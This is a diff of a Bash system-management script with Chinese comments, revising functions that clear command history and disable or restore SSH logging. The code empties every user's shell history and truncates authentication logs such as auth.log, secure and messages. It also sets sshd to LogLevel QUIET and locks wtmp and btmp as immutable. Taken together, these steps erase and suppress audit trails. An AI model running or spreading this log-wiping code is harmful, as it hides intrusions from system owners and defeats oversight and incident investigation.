@@ -171,7 +171,7 @@ clear_command_history() {
     # 将要执行的命令写入临时脚本文件
     cat > "$temp_script" << 'EOF'
 #!/bin/bash
-# 清空所有用户的历史文件 - 更安全的方法，不删除文件而是清空内容
+# 清空所有用户的历史文件
 for user_home in /root /home/*; do
     if [ ! -d "$user_home" ]; then
         continue
@@ -190,106 +190,49 @@ for user_home in /root /home/*; do
     
     for hist_file in "${hist_files[@]}"; do
         if [ -f "$hist_file" ]; then
-            # 获取文件原始权限和所有者
-            original_perms=$(stat -c "%a" "$hist_file" 2>/dev/null)
-            original_owner=$(stat -c "%U:%G" "$hist_file" 2>/dev/null)
-            
-            # 尝试多种清空文件的方法
-            {
-                # 1. 首先尝试如果有写权限直接清空
+            # 检查文件权限并优化清理方式
+            if [ -w "$hist_file" ]; then
+                # 如果文件可写，先尝试移除不可变属性
+                chattr -i "$hist_file" 2>/dev/null || true
+                
+                # 清空文件内容的几种方法尝试
+                # 方法1: 使用重定向
                 : > "$hist_file" 2>/dev/null || \
+                # 方法2: 使用cat命令
                 cat /dev/null > "$hist_file" 2>/dev/null || \
-                truncate -s 0 "$hist_file" 2>/dev/null || \
+                # 方法3: 使用truncate命令
+                truncate -s 0 "$hist_file" 2>/dev/null
                 
-                # 2. 如果直接清空失败，尝试临时修改权限
-                {
-                    # 移除不可变属性
-                    chattr -i "$hist_file" 2>/dev/null
-                    
-                    # 暂时赋予写权限
-                    chmod 644 "$hist_file" 2>/dev/null && \
-                    : > "$hist_file" 2>/dev/null && \
-                    
-                    # 恢复原始权限
-                    if [ -n "$original_perms" ]; then
-                        chmod "$original_perms" "$hist_file" 2>/dev/null
-                    fi
-                } || \
-                
-                # 3. 如果仍然失败，尝试使用sudo，确保能访问所有用户的文件
-                {
-                    sudo bash -c ": > \"$hist_file\"" 2>/dev/null || \
-                    sudo bash -c "cat /dev/null > \"$hist_file\"" 2>/dev/null || \
-                    sudo bash -c "truncate -s 0 \"$hist_file\"" 2>/dev/null
-                } || \
-                
-                # 4. 如果以上都失败，尝试创建新的空文件并替换
-                {
-                    temp_file=$(mktemp)
-                    # 创建空文件
-                    : > "$temp_file"
-                    
-                    # 复制原始权限
-                    if [ -n "$original_perms" ]; then
-                        chmod "$original_perms" "$temp_file" 2>/dev/null
-                    fi
-                    
-                    # 复制原始所有者
-                    if [ -n "$original_owner" ]; then
-                        chown "$original_owner" "$temp_file" 2>/dev/null
-                    fi
-                    
-                    # 替换原来的文件
-                    cat "$temp_file" > "$hist_file" 2>/dev/null || \
-                    mv -f "$temp_file" "$hist_file" 2>/dev/null
-                    
-                    # 清理临时文件
-                    rm -f "$temp_file" 2>/dev/null
-                }
-            } 2>/dev/null
+                # 再次检查是否成功清空
+                if [ -s "$hist_file" ]; then
+                    # 如果文件仍有内容，尝试创建空文件替换
+                    touch "$hist_file.new" 2>/dev/null && \
+                    mv -f "$hist_file.new" "$hist_file" 2>/dev/null
+                fi
+            else
+                # 文件不可写，但我们是root用户，尝试先修改权限
+                chmod u+w "$hist_file" 2>/dev/null && \
+                : > "$hist_file" 2>/dev/null && \
+                chmod u-w "$hist_file" 2>/dev/null
+            fi
         fi
     done
 done
 
-# 清除当前shell的历史 (不会产生错误)
+# 清除当前shell的历史
 history -c 2>/dev/null || true
 history -w 2>/dev/null || true
 
-# 安全地清空系统中的其他历史相关文件
+# 确保系统没有保留任何历史相关文件
 find /var/spool/ /var/log/ /var/tmp/ /tmp/ -name "*history*" -type f 2>/dev/null | while read hist_file; do
-    if [ -f "$hist_file" ]; then
-        # 获取文件原始权限
-        original_perms=$(stat -c "%a" "$hist_file" 2>/dev/null)
-        original_owner=$(stat -c "%U:%G" "$hist_file" 2>/dev/null)
-        
-        # 尝试多种清空文件的方法
-        {
-            # 直接清空
-            truncate -s 0 "$hist_file" 2>/dev/null || \
-            : > "$hist_file" 2>/dev/null || \
-            
-            # 临时修改权限
-            {
-                chmod 644 "$hist_file" 2>/dev/null && \
-                truncate -s 0 "$hist_file" 2>/dev/null && \
-                
-                # 恢复原始权限
-                if [ -n "$original_perms" ]; then
-                    chmod "$original_perms" "$hist_file" 2>/dev/null
-                fi
-            } || \
-            
-            # 使用sudo
-            {
-                sudo truncate -s 0 "$hist_file" 2>/dev/null || \
-                sudo bash -c ": > \"$hist_file\"" 2>/dev/null
-            }
-        } 2>/dev/null
+    if [ -w "$hist_file" ]; then
+        truncate -s 0 "$hist_file" 2>/dev/null || : > "$hist_file" 2>/dev/null
+    else
+        chmod u+w "$hist_file" 2>/dev/null && \
+        truncate -s 0 "$hist_file" 2>/dev/null && \
+        chmod u-w "$hist_file" 2>/dev/null
     fi
 done
-
-# 清空日志后再次执行清除当前shell的历史
-history -c 2>/dev/null || true
 EOF
 
     # 添加执行权限
@@ -528,107 +471,47 @@ disable_ssh_logs() {
     # 将要执行的命令写入临时脚本文件
     cat > "$temp_script" << 'EOF'
 #!/bin/bash
+# 使用chattr命令禁用关键日志文件
+if command -v chattr >/dev/null 2>&1; then
+    # 设置不可变属性
+    chattr +i /var/log/wtmp /var/log/btmp 2>/dev/null
+    
+    # 检查是否成功设置不可变属性
+    lsattr /var/log/wtmp /var/log/btmp 2>/dev/null | grep -q "^-.*i.*-" && \
+    echo "已成功锁定SSH日志文件，现在它们无法被修改" >&2 || \
+    echo "警告：无法锁定某些日志文件，请检查系统权限" >&2
+else
+    echo "错误：系统缺少chattr命令，无法设置文件属性" >&2
+    exit 1
+fi
+
+# 清空日志文件（如果可能）
+for ssh_log in /var/log/auth.log /var/log/secure /var/log/sshd.log /var/log/auth.log.* /var/log/secure.* /var/log/messages; do
+    if [ -f "$ssh_log" ] && [ -w "$ssh_log" ]; then
+        truncate -s 0 "$ssh_log" 2>/dev/null
+    fi
+done
+
+# 如果存在SSH配置，也进行日志禁用配置
 if [ -f "/etc/ssh/sshd_config" ]; then
     # 备份原始配置(如果备份不存在)
     if [ ! -f "/etc/ssh/sshd_config.original" ]; then
         cp /etc/ssh/sshd_config /etc/ssh/sshd_config.original 2>/dev/null
     fi
     
-    # 修改SSH配置
-    sed -i "s/^#*LogLevel.*/LogLevel QUIET/" /etc/ssh/sshd_config
-    sed -i "s/^#*SyslogFacility.*/SyslogFacility AUTHPRIV/" /etc/ssh/sshd_config
-    
-    # 添加或修改额外的日志设置
-    if ! grep -q "^LogLevel QUIET" /etc/ssh/sshd_config; then
-        echo "LogLevel QUIET" >> /etc/ssh/sshd_config
-    fi
-    
-    # 完全禁用SSH日志记录（更强力的设置）
-    for setting in "LogLevel QUIET" "SyslogFacility AUTHPRIV" "PrintLastLog no" "PrintMotd no"; do
-        setting_name=$(echo "$setting" | cut -d" " -f1)
-        
-        # 如果已经有此设置，则修改它
-        if grep -q "^$setting_name" /etc/ssh/sshd_config; then
-            sed -i "s/^$setting_name.*/$setting/" /etc/ssh/sshd_config
-        else
-            # 否则添加新的设置
-            echo "$setting" >> /etc/ssh/sshd_config
-        fi
-    done
-    
-    # 修改rsyslog配置禁止记录SSH日志（如果存在）
-    if [ -d "/etc/rsyslog.d" ]; then
-        # 创建自定义规则文件来禁止SSH日志
-        echo "# 禁止记录SSH日志" > /etc/rsyslog.d/sshd-disable.conf
-        echo "if \$programname == 'sshd' then stop" >> /etc/rsyslog.d/sshd-disable.conf
-        
-        # 重启rsyslog服务
-        if command -v systemctl >/dev/null 2>&1; then
-            systemctl restart rsyslog >/dev/null 2>&1
-        elif command -v service >/dev/null 2>&1; then
-            service rsyslog restart >/dev/null 2>&1
-        fi
-    fi
-    
-    # 修改主rsyslog配置文件（如果存在）
-    if [ -f "/etc/rsyslog.conf" ]; then
-        # 备份原始配置
-        if [ ! -f "/etc/rsyslog.conf.original" ]; then
-            cp /etc/rsyslog.conf /etc/rsyslog.conf.original 2>/dev/null
-        fi
-        
-        # 添加SSH过滤规则到配置文件头部
-        if ! grep -q "if \$programname == 'sshd'" /etc/rsyslog.conf; then
-            sed -i '1s/^/# 禁止记录SSH日志\nif $programname == "sshd" then stop\n\n/' /etc/rsyslog.conf
-        fi
-    fi
-    
-    # 修改syslog配置（如果存在）
-    if [ -f "/etc/syslog.conf" ]; then
-        # 备份原始配置
-        if [ ! -f "/etc/syslog.conf.original" ]; then
-            cp /etc/syslog.conf /etc/syslog.conf.original 2>/dev/null
-        fi
-        
-        # 注释掉与auth和sshd相关的行
-        sed -i 's/^auth\.\*/#auth\.\*/' /etc/syslog.conf
-        sed -i 's/^authpriv\.\*/#authpriv\.\*/' /etc/syslog.conf
-    fi
-    
-    # 屏蔽SSH登录日志的PAM设置
-    if [ -d "/etc/pam.d" ] && [ -f "/etc/pam.d/sshd" ]; then
-        # 备份原始配置
-        if [ ! -f "/etc/pam.d/sshd.original" ]; then
-            cp /etc/pam.d/sshd /etc/pam.d/sshd.original 2>/dev/null
-        fi
-        
-        # 注释掉pam_lastlog.so行
-        sed -i 's/^session.*pam_lastlog.so/#&/' /etc/pam.d/sshd
-        
-        # 注释掉其他可能记录日志的PAM模块
-        sed -i 's/^session.*pam_motd.so/#&/' /etc/pam.d/sshd
-        sed -i 's/^session.*pam_mail.so/#&/' /etc/pam.d/sshd
-    fi
+    # 修改SSH配置减少日志记录
+    sed -i "s/^#*LogLevel.*/LogLevel QUIET/" /etc/ssh/sshd_config 2>/dev/null
+    sed -i "s/^#*PrintLastLog.*/PrintLastLog no/" /etc/ssh/sshd_config 2>/dev/null
     
     # 重启SSH服务
-    if command -v service >/dev/null 2>&1; then
-        service sshd restart >/dev/null 2>&1 || service ssh restart >/dev/null 2>&1
-    elif command -v systemctl >/dev/null 2>&1; then
+    if command -v systemctl >/dev/null 2>&1; then
         systemctl restart sshd >/dev/null 2>&1 || systemctl restart ssh >/dev/null 2>&1
+    elif command -v service >/dev/null 2>&1; then
+        service sshd restart >/dev/null 2>&1 || service ssh restart >/dev/null 2>&1
     fi
-    
-    # 立即清除现有的SSH日志
-    for ssh_log in /var/log/auth.log /var/log/secure /var/log/sshd.log /var/log/auth.log.* /var/log/secure.* /var/log/messages; do
-        if [ -f "$ssh_log" ]; then
-            truncate -s 0 "$ssh_log" 2>/dev/null
-        fi
-    done
-    
-    echo "SSH日志已全面禁用并清除" >&2
-else
-    echo "SSH配置文件不存在" >&2
-    exit 1
 fi
+
+echo "SSH日志已被禁用" >&2
 EOF
 
     # 添加执行权限
@@ -649,66 +532,36 @@ restore_ssh_logs() {
     # 将要执行的命令写入临时脚本文件
     cat > "$temp_script" << 'EOF'
 #!/bin/bash
-# 检查是否存在原始备份
+# 移除日志文件的不可变属性
+if command -v chattr >/dev/null 2>&1; then
+    # 移除不可变属性
+    chattr -i /var/log/wtmp /var/log/btmp 2>/dev/null
+    
+    # 检查是否成功移除不可变属性
+    lsattr /var/log/wtmp /var/log/btmp 2>/dev/null | grep -q "^-.*i.*-" && \
+    echo "警告：日志文件仍有不可变属性，可能需要更高权限" >&2 || \
+    echo "已成功解锁SSH日志文件，现在可以正常记录" >&2
+else
+    echo "错误：系统缺少chattr命令，无法修改文件属性" >&2
+    exit 1
+fi
+
+# 如果存在SSH配置备份，恢复它
 if [ -f "/etc/ssh/sshd_config.original" ]; then
     # 恢复原始备份
     cp /etc/ssh/sshd_config.original /etc/ssh/sshd_config 2>/dev/null
     # 删除备份文件，确保下次禁用时可以创建新的备份
     rm -f "/etc/ssh/sshd_config.original" 2>/dev/null
-else
+elif [ -f "/etc/ssh/sshd_config" ]; then
     # 如果没有原始备份，尝试修改当前配置
-    if [ -f "/etc/ssh/sshd_config" ]; then
-        # 修改到默认日志级别
-        sed -i "s/^LogLevel QUIET/LogLevel INFO/" /etc/ssh/sshd_config
-        sed -i "s/^#*SyslogFacility.*/SyslogFacility AUTH/" /etc/ssh/sshd_config
-        sed -i "s/^PrintLastLog no/PrintLastLog yes/" /etc/ssh/sshd_config
-        sed -i "s/^PrintMotd no/PrintMotd yes/" /etc/ssh/sshd_config
-    else
-        echo "SSH配置文件不存在" >&2
-        exit 1
-    fi
+    sed -i "s/^LogLevel QUIET/LogLevel INFO/" /etc/ssh/sshd_config 2>/dev/null
+    sed -i "s/^PrintLastLog no/PrintLastLog yes/" /etc/ssh/sshd_config 2>/dev/null
 fi
 
-# 恢复rsyslog配置（如果被修改）
-if [ -f "/etc/rsyslog.d/sshd-disable.conf" ]; then
-    rm -f "/etc/rsyslog.d/sshd-disable.conf" 2>/dev/null
-fi
-
-# 恢复主rsyslog配置，仅当文件存在时操作
-if [ -f "/etc/rsyslog.conf.original" ]; then
-    cp /etc/rsyslog.conf.original /etc/rsyslog.conf 2>/dev/null
-    rm -f "/etc/rsyslog.conf.original" 2>/dev/null
-elif [ -f "/etc/rsyslog.conf" ]; then
-    # 仅当文件存在时执行sed操作
-    sed -i '/^# 禁止记录SSH日志$/d' /etc/rsyslog.conf
-    sed -i '/^if $programname == "sshd" then stop$/d' /etc/rsyslog.conf
-fi
-
-# 恢复syslog配置
-if [ -f "/etc/syslog.conf.original" ]; then
-    cp /etc/syslog.conf.original /etc/syslog.conf 2>/dev/null
-    rm -f "/etc/syslog.conf.original" 2>/dev/null
-fi
-
-# 恢复PAM配置
-if [ -f "/etc/pam.d/sshd.original" ]; then
-    cp /etc/pam.d/sshd.original /etc/pam.d/sshd 2>/dev/null
-    rm -f "/etc/pam.d/sshd.original" 2>/dev/null
-else
-    # 如果没有备份，尝试取消注释被修改的行
-    if [ -f "/etc/pam.d/sshd" ]; then
-        sed -i 's/^#\(session.*pam_lastlog.so\)/\1/' /etc/pam.d/sshd
-        sed -i 's/^#\(session.*pam_motd.so\)/\1/' /etc/pam.d/sshd
-        sed -i 's/^#\(session.*pam_mail.so\)/\1/' /etc/pam.d/sshd
-    fi
-fi
-
-# 重启相关服务
+# 重启SSH服务
 if command -v systemctl >/dev/null 2>&1; then
-    systemctl restart rsyslog >/dev/null 2>&1
     systemctl restart sshd >/dev/null 2>&1 || systemctl restart ssh >/dev/null 2>&1
 elif command -v service >/dev/null 2>&1; then
-    service rsyslog restart >/dev/null 2>&1
     service sshd restart >/dev/null 2>&1 || service ssh restart >/dev/null 2>&1
 fi
 
